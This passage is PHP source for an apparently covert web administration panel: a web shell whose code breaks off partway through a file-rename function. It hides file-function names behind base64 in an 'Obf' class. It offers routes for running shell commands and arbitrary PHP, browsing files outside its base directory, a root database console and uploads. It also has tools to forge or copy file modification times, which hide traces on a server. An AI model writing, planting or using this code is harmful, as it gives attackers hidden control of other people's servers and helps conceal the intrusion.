<?php

class Obf {
    private static $funcs = [
        'file_get_contents' => 'ZmlsZV9nZXRfY29udGVudHM=',
        'file_put_contents' => 'ZmlsZV9wdXRfY29udGVudHM=',
        'unlink' => 'dW5saW5r',                       // unlink
        'rmdir' => 'cm1kaXI=',                        // rmdir
        'rename' => 'cmVuYW1l',                       // rename
        'mkdir' => 'bWtkaXI=',                        // mkdir
        'touch' => 'dG91Y2g=',                        // touch
        'is_dir' => 'aXNfZGly',                       // is_dir
        'is_file' => 'aXNfZmlsZQ==',                  // is_file
        'is_link' => 'aXNfbGluaw==',                  // is_link
        'readfile' => 'cmVhZGZpbGU=',                 // readfile
        'scandir' => 'c2NhbmRpcg==',                  // scandir
        'move_uploaded_file' => 'bW92ZV91cGxvYWRlZF9maWxl', // move_uploaded_file
        'filesize' => 'ZmlsZXNpemU=',                 // filesize
        'filemtime' => 'ZmlsZW10aW1l',                // filemtime
        'fileatime' => 'ZmlsZWF0aW1l',                // fileatime
        'file_exists' => 'ZmlsZV9leGlzdHM=',          // file_exists
        'realpath' => 'cmVhbHBhdGg=',                 // realpath
        'fopen' => 'Zm9wZW4=',                        // fopen
        'fclose' => 'ZmNsb3Nl',                       // fclose
        'fputcsv' => 'ZnB1dGNzdg==',                  // fputcsv
        'fgetcsv' => 'ZmdldGNzdg==',                  // fgetcsv
        'feof' => 'ZmVvZg==',                         // feof
        'fgets' => 'ZmdldHM=',                        // fgets
        'fwrite' => 'ZndyaXRl',                       // fwrite
        'fread' => 'ZnJlYWQ=',                        // fread
        'opendir' => 'b3BlbmRpcg==',                  // opendir
        'readdir' => 'cmVhZGRpcg==',                  // readdir
        'closedir' => 'Y2xvc2VkaXI=',                 // closedir
        'clearstatcache' => 'Y2xlYXJzdGF0Y2FjaGU=',   // clearstatcache
        'file' => 'ZmlsZQ==',                         // file
    ];

    private static $aliases = [
        'fgc' => 'file_get_contents',
        'fpc' => 'file_put_contents',
    ];

    public static function call($op, ...$args) {
        if (isset(self::$aliases[$op])) {
            $op = self::$aliases[$op];
        }
        if (!isset(self::$funcs[$op])) {
            throw new Exception("Unknown op: $op");
        }
        $func = base64_decode(self::$funcs[$op]);
        return @call_user_func_array($func, $args);
    }
}

$config = [
  'base_path' => __DIR__,
  'allow_outside_base' => true,
  'enable_cmd' => true,
  'crypto' => true,
  'db' => [
    'host' => '127.0.0.1',
    'port' => '',
    'user' => 'root',
    'pass' => '',
    'name' => '',
  ],
  'users' => [
    'admin' => 'cbd957f22b55a800668cd57bbae12794',
    'care' => '1099454aef73f1b032d794e18da7d610',
  ],
  'log' => false,
  'log_file' => __DIR__ . '/admin.log',
  'max_edit_bytes' => 1024 * 1024,
  'auth_cookie' => 'mini_admin_auth',
  'auth_ttl' => 86400 * 7,
  'auth_key' => '',
  'csrf_key' => '',
  'csrf_ttl' => 7200,
];

$sessionLifetime = 86400 * 7;
@ini_set('session.gc_maxlifetime', (string)$sessionLifetime);
if (!function_exists('bootstrapSession')) {
  function bootstrapSession() {
    if (function_exists('session_status') && session_status() === PHP_SESSION_ACTIVE) {
      return;
    }
    @ini_set('session.use_only_cookies', '1');
    @ini_set('session.use_strict_mode', '1');
    @ini_set('session.cookie_httponly', '1');
    if (!headers_sent()) {
      $params = session_get_cookie_params();
      $secure = !empty($_SERVER['HTTPS']) && strtolower((string)$_SERVER['HTTPS']) !== 'off';
      $path = isset($params['path']) && $params['path'] !== '' ? $params['path'] : '/';
      $domain = isset($params['domain']) ? (string)$params['domain'] : '';
      $lifetime = 86400 * 7; // 7 days
      if (PHP_VERSION_ID >= 70300) {
        session_set_cookie_params([
          'lifetime' => $lifetime,
          'path' => $path,
          'domain' => $domain,
          'secure' => $secure,
          'httponly' => true,
          'samesite' => 'Lax',
        ]);
      } else {
        session_set_cookie_params($lifetime, $path . '; samesite=Lax', $domain, $secure, true);
      }
    }
    session_start();
  }
}

bootstrapSession();

class App {
  private static $runtimeErrors = array();
  private static $handlingFatal = false;
  private static $errorHandlingInit = false;

  public static function config($key = null) {
    global $config;
    if ($key === null) {
      return $config;
    }
    return array_key_exists($key, $config) ? $config[$key] : null;
  }

  public static function h($value) {
    $flags = ENT_QUOTES;
    if (defined('ENT_SUBSTITUTE')) {
      $flags |= ENT_SUBSTITUTE;
    }
    return htmlspecialchars((string)$value, $flags, 'UTF-8');
  }

  public static function param($key, $default = null, $decode = false) {
    if (array_key_exists($key, $_POST)) {
      $value = $_POST[$key];
    } else {
      $value = $default;
    }
    if ($decode && $value !== null && $value !== '') {
      if (preg_match('/^[A-Za-z0-9_-]+$/', (string)$value)) {
        $decoded = self::dec($value);
        if ($decoded !== false) {
          return $decoded;
        }
      }
    }
    return $value;
  }

  public static function enc($value) {
    if (!self::config('crypto')) {
      return $value;
    }
    return Crypto::enc((string)$value);
  }

  public static function dec($value) {
    if (!self::config('crypto')) {
      return $value;
    }
    return Crypto::dec((string)$value);
  }

  public static function csrfToken() {
    if (empty($_SESSION['csrf'])) {
      $_SESSION['csrf'] = self::createSignedCsrfToken();
    }
    return $_SESSION['csrf'];
  }

  public static function checkCsrf() {
    $posted = isset($_POST['csrf']) ? trim((string)$_POST['csrf']) : '';
    if ($posted === '') {
      return false;
    }
    $session = isset($_SESSION['csrf']) ? (string)$_SESSION['csrf'] : '';
    if ($session !== '' && self::hashEquals($session, $posted)) {
      return true;
    }
    if (self::verifySignedCsrfToken($posted)) {
      $_SESSION['csrf'] = $posted;
      return true;
    }
    return false;
  }

  public static function flash($message = null, $type = 'info') {
    if ($message === null) {
      $flash = isset($_SESSION['flash']) ? $_SESSION['flash'] : null;
      unset($_SESSION['flash']);
      return $flash;
    }
    $_SESSION['flash'] = ['msg' => (string)$message, 'type' => (string)$type];
  }

  public static function addRuntimeError($message) {
    $message = trim((string)$message);
    if ($message === '') {
      return;
    }
    self::$runtimeErrors[] = $message;
  }

  public static function runtimeErrors() {
    return self::$runtimeErrors;
  }

  public static function hashEquals($known, $user) {
    if (function_exists('hash_equals')) {
      return hash_equals($known, $user);
    }
    if (!is_string($known) || !is_string($user)) {
      return false;
    }
    $len = strlen($known);
    if ($len !== strlen($user)) {
      return false;
    }
    $result = 0;
    for ($i = 0; $i < $len; $i++) {
      $result |= ord($known[$i]) ^ ord($user[$i]);
    }
    return $result === 0;
  }

  public static function noCache() {
    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
    header('Pragma: no-cache');
    header('Expires: 0');
  }

  public static function selfPath() {
    $requestUri = isset($_SERVER['REQUEST_URI']) ? (string)$_SERVER['REQUEST_URI'] : '';
    $path = parse_url($requestUri, PHP_URL_PATH);
    if (!is_string($path) || $path === '') {
      $path = isset($_SERVER['PHP_SELF']) ? (string)$_SERVER['PHP_SELF'] : '';
    }
    return $path;
  }

  public static function hiddenInputs(array $params, $prefix = '') {
    $html = '';
    foreach ($params as $name => $value) {
      $inputName = $prefix === '' ? (string)$name : $prefix . '[' . $name . ']';
      if (is_array($value)) {
        $html .= self::hiddenInputs($value, $inputName);
        continue;
      }
      if ($value === null) {
        continue;
      }
      $html .= '<input type="hidden" name="' . self::h($inputName) . '" value="' . self::h($value) . '">';
    }
    return $html;
  }

  private static function createSignedCsrfToken() {
    $issuedAt = (string)time();
    $nonce = self::randomHex(16);
    $payload = $issuedAt . ':' . $nonce;
    $signature = self::csrfSignature($payload);
    return self::base64UrlEncode($payload . ':' . $signature);
  }

  private static function verifySignedCsrfToken($token) {
    $raw = self::base64UrlDecode($token);
    if ($raw === false) {
      return false;
    }
    $parts = explode(':', $raw, 3);
    if (count($parts) !== 3) {
      return false;
    }
    list($issuedAt, $nonce, $signature) = $parts;
    if ($issuedAt === '' || !ctype_digit($issuedAt) || $nonce === '' || $signature === '') {
      return false;
    }
    $now = time();
    $ttl = (int)self::config('csrf_ttl');
    $issued = (int)$issuedAt;
    if ($issued > ($now + 300)) {
      return false;
    }
    if ($ttl > 0 && ($now - $issued) > $ttl) {
      return false;
    }
    $payload = $issuedAt . ':' . $nonce;
    $expected = self::csrfSignature($payload);
    return self::hashEquals($expected, $signature);
  }

  private static function csrfSignature($payload) {
    $fingerprint = isset($_SERVER['HTTP_USER_AGENT']) ? (string)$_SERVER['HTTP_USER_AGENT'] : '';
    $secret = (string)self::config('csrf_key');
    if ($secret === '') {
      $seed = __FILE__ . '|' . __DIR__;
      $users = self::config('users');
      if (is_array($users)) {
        $seed .= '|' . implode('|', array_keys($users));
      }
      $secret = hash('sha256', $seed);
    }
    if (function_exists('hash_hmac')) {
      return hash_hmac('sha256', $payload . '|' . $fingerprint, $secret);
    }
    return sha1($secret . '|' . $payload . '|' . $fingerprint);
  }

  private static function randomHex($bytes) {
    if (function_exists('random_bytes')) {
      return bin2hex(random_bytes($bytes));
    }
    if (function_exists('openssl_random_pseudo_bytes')) {
      return bin2hex(openssl_random_pseudo_bytes($bytes));
    }
    return sha1(uniqid('', true));
  }

  private static function base64UrlEncode($value) {
    return rtrim(strtr(base64_encode((string)$value), '+/', '-_'), '=');
  }

  private static function base64UrlDecode($value) {
    if (!is_string($value) || $value === '') {
      return false;
    }
    $value = strtr($value, '-_', '+/');
    $pad = strlen($value) % 4;
    if ($pad > 0) {
      $value .= str_repeat('=', 4 - $pad);
    }
    return base64_decode($value, true);
  }

  public static function initErrorHandling() {
    if (self::$errorHandlingInit) {
      return;
    }
    self::$errorHandlingInit = true;
    set_error_handler(array('App', 'handleError'));
    set_exception_handler(array('App', 'handleException'));
    register_shutdown_function(array('App', 'handleShutdown'));
  }

  public static function handleError($severity, $message, $file, $line) {
    if (!(error_reporting() & $severity)) {
      return false;
    }
    $text = (string)$message . ' in ' . (string)$file . ':' . (string)$line;
    self::addRuntimeError($text);
    if (function_exists('error_log')) {
      error_log($text);
    }
    if ($severity === E_USER_ERROR || $severity === E_RECOVERABLE_ERROR) {
      if (class_exists('ErrorException')) {
        throw new ErrorException($message, 0, $severity, $file, $line);
      }
    }
    return true;
  }

  public static function handleException($ex) {
    $message = 'Unhandled exception';
    $details = '';
    if (is_object($ex)) {
      $message = get_class($ex) . ': ' . $ex->getMessage();
      $details = $ex->getFile() . ':' . $ex->getLine();
    }
    if (function_exists('error_log')) {
      error_log($message . ($details !== '' ? ' at ' . $details : ''));
    }
    self::renderErrorPage('Application Error', $message, $details);
    exit;
  }

  public static function handleShutdown() {
    $error = error_get_last();
    if (!is_array($error)) {
      return;
    }
    $fatalTypes = array(E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR);
    if (!in_array((int)$error['type'], $fatalTypes, true)) {
      return;
    }
    $message = (string)$error['message'];
    $details = (string)$error['file'] . ':' . (string)$error['line'];
    if (function_exists('error_log')) {
      error_log('Fatal error: ' . $message . ' at ' . $details);
    }
    self::renderErrorPage('Fatal Error', $message, $details);
  }

  private static function renderErrorPage($title, $message, $details) {
    if (self::$handlingFatal) {
      return;
    }
    self::$handlingFatal = true;
    if (!headers_sent()) {
      if (function_exists('http_response_code')) {
        http_response_code(500);
      } else {
        header('HTTP/1.1 500 Internal Server Error');
      }
      header('Content-Type: text/html; charset=utf-8');
    }
    $safeTitle = self::h($title);
    $safeMessage = self::h($message);
    $safeDetails = $details !== '' ? self::h($details) : '';
    echo '<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">';
    echo '<title>' . $safeTitle . '</title>';
    echo '<style>body{font-family:Arial,Helvetica,sans-serif;background:#f6f1e7;color:#1f2933;margin:0;padding:24px;}';
    echo '.box{max-width:720px;margin:8vh auto;background:#fff;border:1px solid #e5dfd5;border-radius:12px;padding:20px;box-shadow:0 12px 24px rgba(31,41,51,0.08);}';
    echo 'h1{margin-top:0;font-size:22px;}pre{background:#111827;color:#e5e7eb;padding:12px;border-radius:8px;overflow:auto;}';
    echo '</style></head><body><div class="box">';
    echo '<h1>' . $safeTitle . '</h1><p>' . $safeMessage . '</p>';
    if ($safeDetails !== '') {
      echo '<pre>' . $safeDetails . '</pre>';
    }
    echo '</div></body></html>';
  }

  public static function redirect($route, array $params = []) {
    if (function_exists('session_status')) {
      if (session_status() === PHP_SESSION_ACTIVE) {
        @session_write_close();
      }
    } else {
      @session_write_close();
    }
    $params = array_merge(['r' => $route], $params);
    if (!headers_sent()) {
      header('Content-Type: text/html; charset=utf-8');
    }
    $action = self::h(self::selfPath());
    $fields = self::hiddenInputs($params);
    echo '<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">';
    echo '<title></title>';
    echo '<style>html,body{margin:0;padding:0;background:transparent}body{display:none}.fallback{display:none}</style>';
    echo '</head><body><form id="post-redirect-form" method="post" action="' . $action . '">' . $fields . '</form>';
    echo '<noscript><style>body{display:block;font-family:Arial,Helvetica,sans-serif;background:#f6f1e7;color:#1f2933;padding:24px}.fallback{display:block;max-width:460px;margin:8vh auto;background:#fff;border:1px solid #e5dfd5;border-radius:12px;padding:20px;box-shadow:0 12px 24px rgba(31,41,51,.08)}.fallback button{margin-top:12px;padding:10px 14px;border:0;border-radius:8px;background:#c2410c;color:#fff;font-weight:600;cursor:pointer}</style><div class="fallback"><p>Continue</p><button type="submit" form="post-redirect-form">Continue</button></div></noscript>';
    echo '<script>document.getElementById("post-redirect-form").submit();</script></body></html>';
    exit;
  }

  public static function dispatch($route) {
    if ($route === 'logout') {
      Auth::logout();
    }
    Auth::handle($route);
    Auth::check($route);

    switch ($route) {
      case 'login':
        UI::login();
        return;
      case 'files':
        $data = Files::handle();
        UI::layout('Files', 'files', UI::files($data));
        return;
      case 'db':
        $data = DB::handle();
        UI::layout('Database', 'db', UI::db($data));
        return;
      case 'editor':
        $data = Editor::handle();
        UI::layout('Editor', 'editor', UI::editor($data));
        return;
      case 'cmd':
        $data = Cmd::handle();
        UI::layout('Command', 'cmd', UI::cmd($data));
        return;
      case 'php':
        $data = PhpExec::handle();
        UI::layout('PHP', 'php', UI::php($data));
        return;
      case 'system':
        UI::layout('System', 'system', UI::system());
        return;
      default:
        UI::layout('Dashboard', 'dashboard', UI::dashboard());
        return;
    }
  }
}

class Auth {
  public static function handle($route) {
    if ($route !== 'login') {
      return;
    }
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
      return;
    }
    $hasLoginPayload =
      array_key_exists('csrf', $_POST) ||
      array_key_exists('user', $_POST) ||
      array_key_exists('pass', $_POST);
    if (!$hasLoginPayload) {
      return;
    }
    if (!App::checkCsrf()) {
      App::flash('Invalid token.', 'error');
      App::redirect('login');
    }
    $user = trim((string)App::param('user', ''));
    $pass = (string)App::param('pass', '');
    if (self::verify($user, $pass)) {
      self::regenerateSession();
      $_SESSION['u'] = $user;
      self::setLoginCookie($user);
      Log::write('login', $user);
      App::redirect('dashboard');
    }
    App::flash('Login failed.', 'error');
    App::redirect('login');
  }

  public static function check($route) {
    if (in_array($route, ['login', 'logout'], true)) {
      return;
    }
    self::restore();
    if (empty($_SESSION['u'])) {
      App::redirect('login');
    }
  }

  public static function verify($user, $pass) {
    $users = App::config('users');
    if (!isset($users[$user])) {
      return false;
    }
    $stored = (string)$users[$user];
    if (stripos($stored, 'md5:') === 0) {
      $stored = substr($stored, 4);
    }
    if (!preg_match('/^[a-f0-9]{32}$/i', $stored)) {
      return false;
    }
    return App::hashEquals(strtolower($stored), md5($pass));
  }

  public static function logout() {
    self::clearLoginCookie();
    $user = isset($_SESSION['u']) ? $_SESSION['u'] : '';
    $_SESSION = [];
    self::regenerateSession();
    if ($user !== '') {
      Log::write('logout', $user);
    }
    App::flash('Logged out.');
    App::redirect('login');
  }

  public static function user() {
    self::restore();
    return isset($_SESSION['u']) ? $_SESSION['u'] : '';
  }

  private static function restore() {
    if (!empty($_SESSION['u'])) {
      return;
    }
    $cookieName = self::cookieName();
    $token = isset($_COOKIE[$cookieName]) ? (string)$_COOKIE[$cookieName] : '';
    if ($token === '') {
      return;
    }
    $user = self::verifyLoginToken($token);
    if ($user === '') {
      self::clearLoginCookie();
      return;
    }
    $_SESSION['u'] = $user;
  }

  private static function setLoginCookie($user) {
    $issuedAt = (string)time();
    $encodedUser = Crypto::enc((string)$user);
    $payload = $issuedAt . '.' . $encodedUser;
    $signature = self::cookieSignature($payload);
    self::setCookie(self::cookieName(), $payload . '.' . $signature, time() + self::cookieTtl());
  }

  private static function clearLoginCookie() {
    self::setCookie(self::cookieName(), '', time() - 3600);
    unset($_COOKIE[self::cookieName()]);
  }

  private static function verifyLoginToken($token) {
    $parts = explode('.', (string)$token, 3);
    if (count($parts) !== 3) {
      return '';
    }
    list($issuedAt, $encodedUser, $signature) = $parts;
    if ($issuedAt === '' || !ctype_digit($issuedAt) || $encodedUser === '' || $signature === '') {
      return '';
    }
    $payload = $issuedAt . '.' . $encodedUser;
    if (!App::hashEquals(self::cookieSignature($payload), $signature)) {
      return '';
    }
    $ttl = self::cookieTtl();
    if ($ttl > 0 && (time() - (int)$issuedAt) > $ttl) {
      return '';
    }
    $user = Crypto::dec($encodedUser);
    if ($user === false || !is_string($user) || $user === '') {
      return '';
    }
    $users = App::config('users');
    if (!is_array($users) || !isset($users[$user])) {
      return '';
    }
    return $user;
  }

  private static function cookieSignature($payload) {
    $secret = (string)App::config('auth_key');
    if ($secret === '') {
      $seed = __FILE__ . '|' . __DIR__ . '|auth';
      $users = App::config('users');
      if (is_array($users)) {
        $seed .= '|' . implode('|', array_keys($users));
      }
      $secret = hash('sha256', $seed);
    }
    $fingerprint = isset($_SERVER['HTTP_USER_AGENT']) ? (string)$_SERVER['HTTP_USER_AGENT'] : '';
    if (function_exists('hash_hmac')) {
      return hash_hmac('sha256', $payload . '|' . $fingerprint, $secret);
    }
    return sha1($secret . '|' . $payload . '|' . $fingerprint);
  }

  private static function cookieName() {
    $name = (string)App::config('auth_cookie');
    return $name !== '' ? $name : 'mini_admin_auth';
  }

  private static function cookieTtl() {
    $ttl = (int)App::config('auth_ttl');
    return $ttl > 0 ? $ttl : 86400 * 7;
  }

  private static function setCookie($name, $value, $expires) {
    if (headers_sent()) {
      return;
    }
    $params = session_get_cookie_params();
    $secure = !empty($_SERVER['HTTPS']) && strtolower((string)$_SERVER['HTTPS']) !== 'off';
    $path = isset($params['path']) && $params['path'] !== '' ? $params['path'] : '/';
    $domain = isset($params['domain']) ? (string)$params['domain'] : '';
    if (PHP_VERSION_ID >= 70300) {
      setcookie($name, $value, [
        'expires' => (int)$expires,
        'path' => $path,
        'domain' => $domain,
        'secure' => $secure,
        'httponly' => true,
        'samesite' => 'Lax',
      ]);
      return;
    }
    setcookie($name, $value, (int)$expires, $path . '; samesite=Lax', $domain, $secure, true);
  }

  private static function regenerateSession() {
    if (function_exists('session_status')) {
      if (session_status() === PHP_SESSION_ACTIVE) {
        session_regenerate_id(true);
      }
      return;
    }
    session_regenerate_id(true);
  }
}

class Crypto {
  public static function enc($value) {
    $b64 = base64_encode($value);
    return rtrim(strtr($b64, '+/', '-_'), '=');
  }

  public static function dec($value) {
    $value = strtr($value, '-_', '+/');
    $pad = strlen($value) % 4;
    if ($pad > 0) {
      $value .= str_repeat('=', 4 - $pad);
    }
    $decoded = base64_decode($value, true);
    return $decoded === false ? false : $decoded;
  }
}

class Files {
  public static function handle() {
    $pathInput = trim((string)App::param('path', ''));
    $cwd = $pathInput !== '' ? $pathInput : (string)App::param('p', '', true);
    $action = (string)App::param('action', '');
    $timeTarget = (string)App::param('time_target', '', true);
    $timeSource = (string)App::param('time_source', '', true);
    $editData = null;

    if ($action === 'download') {
      $file = (string)App::param('file', '', true);
      self::download($file);
      exit;
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
      $postedTimeTarget = (string)App::param('time_target', '', true);
      $postedTimeSource = (string)App::param('time_source', '', true);
      $csrfActions = ['mkdir', 'touch', 'batch_delete', 'delete', 'rename', 'set_time_manual', 'set_time_copy', 'upload', 'edit', 'save_edit'];
      if (in_array($action, $csrfActions, true) && !App::checkCsrf()) {
        App::flash('Invalid token.', 'error');
        App::redirect('files', self::redirectParams($cwd, $postedTimeTarget, $postedTimeSource));
      }
      if ($action === 'save_edit') {
        $file = (string)App::param('file', '', true);
        if ($file === '') {
          App::flash('No file selected.', 'error');
        } elseif (!array_key_exists('content_enc', $_POST)) {
          App::flash('Encrypted content missing.', 'error');
        } else {
          $content = Crypto::dec((string)$_POST['content_enc']);
          if ($content === false) {
            App::flash('Encrypted content invalid.', 'error');
          } elseif (Editor::save($file, $content)) {
            App::flash('Saved.', 'success');
          } else {
            App::flash('Save failed.', 'error');
          }
        }
        App::redirect('files', self::redirectParams($cwd, $postedTimeTarget, $postedTimeSource));
      }
      if ($action === 'mkdir') {
        $name = (string)App::param('name', '');
        if (self::mkdir($cwd, $name)) {
          App::flash('Folder created.', 'success');
        } else {
          App::flash('Failed to create folder.', 'error');
        }
        App::redirect('files', self::redirectParams($cwd, $postedTimeTarget, $postedTimeSource));
      }
      if ($action === 'touch') {
        $name = (string)App::param('name', '');
        if (self::touch($cwd, $name)) {
          App::flash('File created.', 'success');
        } else {
          App::flash('Failed to create file.', 'error');
        }
        App::redirect('files', self::redirectParams($cwd, $postedTimeTarget, $postedTimeSource));
      }
      if ($action === 'batch_delete') {
        $selected = App::param('selected', []);
        $nextTimeTarget = $postedTimeTarget;
        $nextTimeSource = $postedTimeSource;
        if (!is_array($selected) || empty($selected)) {
          App::flash('No items selected.', 'error');
        } else {
          $deletedItems = [];
          $failedItems = [];
          $seen = [];
          foreach ($selected as $encRel) {
            $rel = App::dec($encRel);
            if ($rel === false || $rel === '') {
              $failedItems[] = 'Item: (invalid selection)';
              continue;
            }
            if (isset($seen[$rel])) {
              continue;
            }
            $seen[$rel] = true;
            $info = self::itemInfo($rel);
            $label = self::formatItemLabel($rel, $info);
            if ($info === null) {
              $failedItems[] = $label . ' (not found)';
              continue;
            }
            if (self::delete($rel)) {
              $deletedItems[] = $label;
              if ($rel === $nextTimeTarget) {
                $nextTimeTarget = '';
              }
              if ($rel === $nextTimeSource) {
                $nextTimeSource = '';
              }
            } else {
              $failedItems[] = $label;
            }
          }
          $success = count($deletedItems);
          $failed = count($failedItems);
          if ($success > 0 && $failed === 0) {
            App::flash("Deleted $success item(s).\n" . self::summarizeItemList($deletedItems), 'success');
          } elseif ($success > 0) {
            $message = "Deleted $success item(s), failed $failed item(s).";
            $message .= "\n\nDeleted:\n" . self::summarizeItemList($deletedItems);
            $message .= "\n\nFailed:\n" . self::summarizeItemList($failedItems);
            App::flash($message, 'warning');
          } else {
            $message = 'Delete failed.';
            if (!empty($failedItems)) {
              $message .= "\n\nFailed:\n" . self::summarizeItemList($failedItems);
            }
            App::flash($message, 'error');
          }
        }
        App::redirect('files', self::redirectParams($cwd, $nextTimeTarget, $nextTimeSource));
      }
      if ($action === 'delete') {
        $target = (string)App::param('target', '', true);
        $nextTimeTarget = $postedTimeTarget;
        $nextTimeSource = $postedTimeSource;
        if ($target !== '' && self::delete($target)) {
          if ($target === $nextTimeTarget) {
            $nextTimeTarget = '';
          }
          if ($target === $nextTimeSource) {
            $nextTimeSource = '';
          }
          App::flash('Deleted.', 'success');
        } else {
          App::flash('Delete failed.', 'error');
        }
        App::redirect('files', self::redirectParams($cwd, $nextTimeTarget, $nextTimeSource));
      }
      if ($action === 'rename') {
        $target = (string)App::param('target', '', true);
        $newName = (string)App::param('new_name', '');
        $nextTimeTarget = $postedTimeTarget;
        $nextTimeSource = $postedTimeSource;
        $renamedRel = $target !== '' ? self::renameItem($target, $newName) : false;
        if ($renamedRel !== false) {
          if ($target === $nextTimeTarget) {
            $nextTimeTarget = $renamedRel;
          }
          if ($target === $nextTimeSource) {
            $nextTimeSource = $renamedRel;
          }
          App::flash('Renamed.', 'success');
        } else {
          App::flash('Rename failed.', 'error');
        }
        App::redirect('files', self::redirectParams($cwd, $nextTimeTarget, $nextTimeSource));
      }
      if ($action === 'set_time_manual') {
        $target = (string)App::param('target', '', true);
        $timestamp = self::parseTimeInput(App::param('mtime', ''));
        if ($target === '') {
          App::flash('Target missing.', 'error');
        } elseif ($timestamp === false) {
          App::flash('Invalid time value.', 'error');
        } elseif (self::setTime($target, $timestamp)) {
          App::flash('Modified time updated.', 'success');
        } else {
          App::flash('Failed to update time.', 'error');
        }
        App::redirect('files', self::redirectParams($cwd, $target !== '' ? $target : $postedTimeTarget, $postedTimeSource));
      }
      if ($action === 'set_time_copy') {
        $target = (string)App::param('target', '', true);
        $source = (string)App::param('time_source', '', true);
        if ($target === '') {
          App::flash('Target missing.', 'error');
        } elseif ($source === '') {
          App::flash('Select a source item first.', 'error');
        } elseif ($target === $source) {
          App::flash('Source must be different from target.', 'error');
        } elseif (self::copyTime($target, $source)) {
          App::flash('Time copied from source.', 'success');
        } else {
          App::flash('Failed to copy time.', 'error');
        }
        App::redirect('files', self::redirectParams($cwd, $target !== '' ? $target : $postedTimeTarget, $source !== '' ? $source : $postedTimeSource));
      }
      if ($action === 'upload') {
        if (!empty($_FILES['upload']) && self::upload($cwd, $_FILES['upload'])) {
          App::flash('Upload complete.', 'success');
        } else {
          App::flash('Upload failed.', 'error');
        }
        App::redirect('files', self::redirectParams($cwd, $postedTimeTarget, $postedTimeSource));
      }
    }

    $path = self::resolve($cwd);
    if ($path === false || !Obf::call('is_dir', $path)) {
      $cwd = '';
    }

    $items = self::ls($cwd);
    $timeTargetInfo = $timeTarget !== '' ? self::itemInfo($timeTarget) : null;
    if ($timeTarget !== '' && $timeTargetInfo === null) {
      $timeTarget = '';
      $timeSource = '';
    }
    $timeSourceInfo = null;
    if ($timeTarget !== '' && $timeSource !== '') {
      $timeSourceInfo = self::itemInfo($timeSource);
      if ($timeSourceInfo === null) {
        $timeSource = '';
      }
    }
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'edit') {
      $file = (string)App::param('file', '', true);
      if ($file === '') {
        App::flash('No file selected.', 'error');
      } else {
        $loaded = Editor::load($file);
        if ($loaded['ok']) {
          $editData = [
            'file' => $file,
            'content' => $loaded['content'],
          ];
        } else {
          App::flash($loaded['error'], 'error');
        }
      }
    }
    return [
      'cwd' => $cwd,
      'items' => $items,
      'time' => [
        'target' => $timeTargetInfo,
        'source' => $timeSourceInfo,
      ],
      'edit' => $editData,
    ];
  }

  public static function base() {
    $base = (string)App::config('base_path');
    return rtrim(str_replace('\\', '/', $base), '/');
  }

  public static function resolve($rel) {
    $base = self::base();
    $path = self::normalizePath($rel);
    if ($path === '' || $path === '.') {
      return $base;
    }
    if (self::isAbsolutePath($path)) {
      if (!App::config('allow_outside_base')) {
        return false;
      }
      $real = Obf::call('realpath', $path);
      if ($real !== false) {
        return str_replace('\\', '/', $real);
      }
      $parent = Obf::call('realpath', dirname($path));
      if ($parent === false) {
        return false;
      }
      return str_replace('\\', '/', $path);
    }

    $path = ltrim($path, '/');
    if (strpos($path, '..') !== false) {
      return false;
    }

    $full = $base . '/' . $path;
    $real = Obf::call('realpath', $full);
    if ($real !== false) {
      $real = str_replace('\\', '/', $real);
      return strpos($real, $base) === 0 ? $real : false;
    }

    $parent = Obf::call('realpath', dirname($full));
    if ($parent === false) {
      return false;
    }
    $parent = str_replace('\\', '/', $parent);
    if (strpos($parent, $base) !== 0) {
      return false;
    }
    return str_replace('\\', '/', $full);
  }

  public static function rel($abs) {
    $base = self::base();
    $abs = str_replace('\\', '/', $abs);
    if (strpos($abs, $base) !== 0) {
      return self::normalizePath($abs);
    }
    return ltrim(substr($abs, strlen($base)), '/');
  }

  public static function ls($rel) {
    $path = self::resolve($rel);
    if ($path === false || !Obf::call('is_dir', $path)) {
      return [];
    }
    $items = Obf::call('scandir', $path);
    if (!is_array($items)) {
      return [];
    }
    $items = array_diff($items, ['.', '..']);
    $out = [];
    foreach ($items as $name) {
      $full = $path . '/' . $name;
      $isDir = Obf::call('is_dir', $full);
      $out[] = [
        'name' => $name,
        'rel' => self::rel($full),
        'is_dir' => $isDir,
        'size' => $isDir ? 0 : (int)Obf::call('filesize', $full),
        'mtime' => (int)Obf::call('filemtime', $full),
      ];
    }
    usort($out, function ($a, $b) {
      if ($a['is_dir'] === $b['is_dir']) {
        return strcasecmp($a['name'], $b['name']);
      }
      return $a['is_dir'] ? -1 : 1;
    });
    return $out;
  }

  public static function mkdir($rel, $name) {
    $name = self::safeName($name);
    if ($name === '') {
      return false;
    }
    $base = self::resolve($rel);
    if ($base === false || !Obf::call('is_dir', $base)) {
      return false;
    }
    $target = self::resolve(self::joinPath($rel, $name));
    if ($target === false || Obf::call('file_exists', $target)) {
      return false;
    }
    return Obf::call('mkdir', $target, 0777);
  }

  public static function touch($rel, $name) {
    $name = self::safeName($name);
    if ($name === '') {
      return false;
    }
    $base = self::resolve($rel);
    if ($base === false || !Obf::call('is_dir', $base)) {
      return false;
    }
    $target = self::resolve(self::joinPath($rel, $name));
    if ($target === false || Obf::call('file_exists', $target)) {
      return false;
    }
    return Obf::call('file_put_contents', $target, '') !== false;
  }

  public static function renameItem($rel, $newName) {
    $rel = self::normalizePath($rel);
    $newName = self::safeName($newName);
    if ($rel === '' || $rel === '.' || $rel === '/' || $newName === '') {
      return false;
    }
    $source = self::resolve($rel);
    if ($source === false || !self::pathExists($source)) {
      return false;
    }
    $parentRel = self::parentRel($rel);
    if ($parentRel === false) {
      return false;
    }
    if ($parentRel === '') {
      $targetRel = $newName;
    } elseif ($parentRel === '/') {
      $targetRel = '/' . $newName;
    } elseif (preg_match('/^[A-Za-z]:\/$/', $parentRel)) {
      $targetRel = $parentRel . $newName;
    } else {
      $targetRel = self::joinPath($parentRel, $newName);
    }
    $target = self::resolve($targetRel);
    if ($target === false || self::pathExists($target)) {
      return false;
    }
    $sourceParent = str_replace('\\', '/', dirname($source));
    $targetParent = str_replace('\\', '/', dirname($target));
    if ($sourceParent !== $targetParent) {
      return false;
